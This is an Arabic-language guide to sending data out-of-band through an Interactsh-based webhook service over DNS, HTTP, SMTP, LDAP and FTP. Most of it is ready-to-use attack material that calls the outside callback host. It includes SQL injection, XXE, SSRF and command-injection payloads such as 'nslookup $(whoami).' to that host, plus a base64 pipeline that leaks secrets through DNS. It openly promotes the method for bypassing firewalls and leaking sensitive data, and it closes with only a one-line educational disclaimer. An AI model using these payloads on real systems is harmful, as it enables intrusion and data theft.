# دليل الإرسال عبر DNS و OOB Protocols مع Interactsh

## مقدمة

**Interactsh** هي منصة متخصصة في استقبال البيانات من خلال قنوات **Out-of-Band (OOB)**، مما يسمح لك بـ:
- اختبار الثغرات الأمنية
- اكتشاف تسريب البيانات
- مراقبة الاتصالات الخارجية
- تتبع الطلبات من الأنظمة البعيدة

---

## الحصول على معرّفك الفريد (Credentials)

### الخطوة 1: استدعاء مسار الـ Credentials

```bash
curl https://fastapi-webhook-receiver.onrender.com/oob/credentials
```

### النتيجة المتوقعة:

```json
{
  "status": "success",
  "interactsh_url": "abc123def456.interactsh.com",
  "interactsh_token": "your_unique_token_here",
  "service_status": "active",
  "timestamp": "2026-03-23T22:30:00.000000",
  "usage": {
    "dns": "Send DNS queries to: abc123def456.interactsh.com",
    "http": "Send HTTP requests to: http://abc123def456.interactsh.com",
    "https": "Send HTTPS requests to: https://abc123def456.interactsh.com",
    "smtp": "Send SMTP requests to: abc123def456.interactsh.com",
    "ldap": "Send LDAP requests to: abc123def456.interactsh.com"
  }
}
```

### شرح البيانات:

| الحقل | الوصف |
| :--- | :--- |
| **interactsh_url** | رابط Interactsh الفريد الخاص بك (هذا هو الـ ID الخاص بك) |
| **interactsh_token** | التوكن المستخدم للاستعلام عن البيانات |
| **service_status** | حالة الخدمة (active/inactive) |

---

## كيفية الإرسال عبر DNS

### ما هو DNS OOB؟

**DNS OOB** (Out-of-Band DNS) هو تقنية تستخدم استعلامات DNS للتواصل مع خادم خارجي. بدلاً من الاتصال المباشر، يتم إرسال البيانات عبر استعلام DNS، مما يسمح بـ:
- تجاوز جدران الحماية (Firewalls)
- اكتشاف الثغرات في التطبيقات
- تسريب البيانات الحساسة

### أمثلة الإرسال عبر DNS

#### 1. استعلام DNS بسيط

```bash
# استبدل abc123def456.interactsh.com برابطك الفريد
nslookup abc123def456.interactsh.com
```

#### 2. استعلام DNS مع بيانات مدمجة

```bash
# إرسال بيانات في اسم النطاق
nslookup data_here.abc123def456.interactsh.com
```

**مثال عملي:**
```bash
nslookup admin_password_12345.abc123def456.interactsh.com
```

#### 3. استعلام DNS من سطر الأوامر (Linux/Mac)

```bash
# استعلام DNS بسيط
dig abc123def456.interactsh.com

# استعلام DNS مع بيانات
dig sensitive_data.abc123def456.interactsh.com

# استعلام DNS من نوع TXT
dig TXT abc123def456.interactsh.com
```

#### 4. استعلام DNS من Windows

```cmd
nslookup abc123def456.interactsh.com
nslookup data_here.abc123def456.interactsh.com
```

---

## بروتوكولات OOB الأخرى

### 1. HTTP/HTTPS Requests

```bash
# طلب HTTP بسيط
curl http://abc123def456.interactsh.com

# طلب HTTP مع بيانات
curl "http://abc123def456.interactsh.com/path?data=sensitive_info"

# طلب HTTPS
curl "https://abc123def456.interactsh.com"

# طلب مع رؤوس مخصصة
curl -H "Authorization: Bearer token123" "http://abc123def456.interactsh.com"
```

### 2. SMTP (البريد الإلكتروني)

```bash
# الاتصال بخادم SMTP
telnet abc123def456.interactsh.com 25

# إرسال بريد
echo "Subject: Test" | mail -S smtp=abc123def456.interactsh.com user@example.com
```

### 3. LDAP

```bash
# الاتصال بـ LDAP
ldapsearch -H ldap://abc123def456.interactsh.com -x
```

### 4. FTP

```bash
# الاتصال بـ FTP
ftp abc123def456.interactsh.com
```

---

## أمثلة عملية متقدمة

### مثال 1: اختبار SQL Injection مع DNS OOB

```sql
-- في تطبيق ويب عرضة لـ SQL Injection
'; SELECT * FROM users WHERE '1'='1' INTO OUTFILE '\\\\abc123def456.interactsh.com\\share'; --
```

### مثال 2: اختبار XXE (XML External Entity) مع DNS OOB

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://abc123def456.interactsh.com/test">
]>
<foo>&xxe;</foo>
```

### مثال 3: اختبار SSRF (Server-Side Request Forgery)

```bash
# في تطبيق يسمح برفع صور من رابط خارجي
curl -X POST http://vulnerable-app.com/upload \
  -d "image_url=http://abc123def456.interactsh.com/image.jpg"
```

### مثال 4: اختبار RCE (Remote Code Execution) مع DNS

```bash
# في تطبيق عرضة لـ Command Injection
; nslookup $(whoami).abc123def456.interactsh.com ;
```

---

## مراقبة البيانات المستقبلة

### الطريقة 1: عبر API الخاص بنا

```bash
# الحصول على جميع التفاعلات
curl https://fastapi-webhook-receiver.onrender.com/oob/interactions

# الحصول على آخر 5 تفاعلات
curl "https://fastapi-webhook-receiver.onrender.com/oob/interactions?limit=5"
```

### الطريقة 2: سحب البيانات فوراً

```bash
# بدلاً من الانتظار 60 ثانية، اسحب البيانات الآن
curl -X POST https://fastapi-webhook-receiver.onrender.com/oob/poll-now
```

### الطريقة 3: مراقبة السجلات

```bash
# تحقق من Render Dashboard > Logs
# ستظهر جميع التفاعلات المستقبلة هناك
```

---

## جدول مقارنة البروتوكولات

| البروتوكول | الاستخدام | الأداء | الموثوقية |
| :--- | :--- | :--- | :--- |
| **DNS** | اختبار الثغرات، تسريب البيانات | سريع جداً | عالية جداً |
| **HTTP/HTTPS** | اختبارات ويب، SSRF | سريع | عالية |
| **SMTP** | اختبارات البريد | متوسط | متوسطة |
| **LDAP** | اختبارات الدليل | متوسط | متوسطة |
| **FTP** | اختبارات نقل الملفات | بطيء | منخفضة |

---

## نصائح وحيل

### 1. إخفاء البيانات في DNS

```bash
# بدلاً من إرسال البيانات مباشرة
# استخدم encoding أو hashing
echo -n "secret_data" | base64 | xargs -I {} nslookup {}.abc123def456.interactsh.com
```

### 2. اختبار متعدد الخطوات

```bash
# الخطوة 1: اختبار الاتصال
nslookup test.abc123def456.interactsh.com

# الخطوة 2: انتظر قليلاً
sleep 2

# الخطوة 3: اسحب البيانات
curl https://fastapi-webhook-receiver.onrender.com/oob/interactions
```

### 3. أتمتة الاختبارات

```bash
#!/bin/bash
URL="abc123def456.interactsh.com"
TOKEN="your_token"

# اختبر عدة نقاط نهاية
for i in {1..5}; do
  nslookup "test_$i.$URL"
  sleep 1
done

# اسحب النتائج
curl https://fastapi-webhook-receiver.onrender.com/oob/interactions
```

---

## استكشاف الأخطاء

### المشكلة: لا توجد بيانات مستقبلة

**الحلول:**
1. تأكد من استخدام الـ URL الصحيح من مسار `/oob/credentials`
2. تحقق من أن الاتصال بالإنترنت يعمل
3. تأكد من أن جدار الحماية لا يحظر الاتصالات الخارجية

### المشكلة: البيانات تظهر بعد تأخير

**السبب:** الجدولة تعمل كل 60 ثانية. استخدم `/oob/poll-now` للسحب الفوري.

### المشكلة: الـ Token غير صحيح

**الحل:** احصل على معرّف جديد من `/oob/credentials`

---

## أمثلة كاملة

### مثال شامل: اختبار SSRF

```bash
#!/bin/bash

# 1. احصل على معرّفك
CREDS=$(curl -s https://fastapi-webhook-receiver.onrender.com/oob/credentials)
URL=$(echo $CREDS | grep -o '"interactsh_url":"[^"]*' | cut -d'"' -f4)

echo "Using URL: $URL"

# 2. اختبر SSRF
curl -X POST http://vulnerable-app.com/fetch \
  -d "url=http://$URL/test"

# 3. انتظر قليلاً
sleep 5

# 4. اسحب النتائج
curl -s https://fastapi-webhook-receiver.onrender.com/oob/interactions | python3 -m json.tool
```

---

## الخلاصة

| المفهوم | الشرح |
| :--- | :--- |
| **معرّفك الفريد** | رابط Interactsh من `/oob/credentials` |
| **DNS OOB** | إرسال البيانات عبر استعلامات DNS |
| **المراقبة** | استخدم `/oob/interactions` لرؤية البيانات |
| **السحب الفوري** | استخدم `/oob/poll-now` لعدم الانتظار |

**تذكر:** استخدم هذه التقنيات فقط في الأغراض التعليمية والاختبارات الموثوقة!
